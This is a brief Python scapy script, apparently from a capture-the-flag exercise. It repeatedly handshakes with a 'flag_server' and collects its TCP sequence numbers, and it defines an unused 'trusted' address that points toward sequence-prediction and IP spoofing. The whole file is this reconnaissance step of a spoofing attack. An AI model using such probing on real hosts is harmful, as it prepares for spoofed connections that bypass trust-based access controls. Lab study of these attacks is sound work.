from scapy.all import *
from scapy.layers.inet import IP, TCP

sport = 13337
dport = 13337
seq = 1000
vpn_source_address = '172.16.44.26'
trusted_source_address = '10.2.4.10'
flag_server = '172.16.44.1'
i = 0
seq_list = []
while i < 100:
    # SYN
    print('****** Iteration number {}*******', i)
    ip = IP(src=vpn_source_address, dst=flag_server)
    SYN = TCP(sport=sport, dport=dport, flags='S', seq=seq)
    SYNACK = sr1(ip / SYN / vpn_source_address)
    SYNACK.show()
    print('SYNACK', SYNACK)
    seq_list.append(SYNACK.seq)
    ACK = TCP(sport=sport, dport=dport, flags='A', seq=SYNACK.ack, ack=SYNACK.seq + 1)
    ACK.show()
    print('ACK', ACK)
    send(ip / ACK / vpn_source_address)
    i = i + 1
    print("Done")

    # count = 0
    print('Finished iteration')
    print('final seq list', seq_list)
